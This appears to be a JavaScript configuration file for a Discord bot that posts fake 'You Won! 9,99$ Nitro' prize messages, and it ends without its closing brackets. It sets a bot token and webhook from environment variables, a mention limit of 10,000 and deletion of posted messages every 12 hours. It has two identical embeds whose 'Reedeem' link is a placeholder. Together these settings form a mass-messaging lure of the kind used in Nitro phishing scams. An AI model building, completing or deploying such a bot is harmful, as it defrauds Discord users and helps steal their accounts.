module.exports = {
    token: process.env.token,
    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    embed: [
       {
  "content": null,
  "embeds": [
    {
      "title": "You Won!",
      "description": "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](URL)",
      "color": 14680319,
      "image": {
        "url": "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
      }
    }
  ],
  "attachments": []
},

    embed2: [{
  "content": null,
  "embeds": [
    {
      "title": "You Won!",
      "description": "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](URL)",
      "color": 14680319,
      "image": {
        "url": "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
      }
    }
  ],
  "attachments": []
}
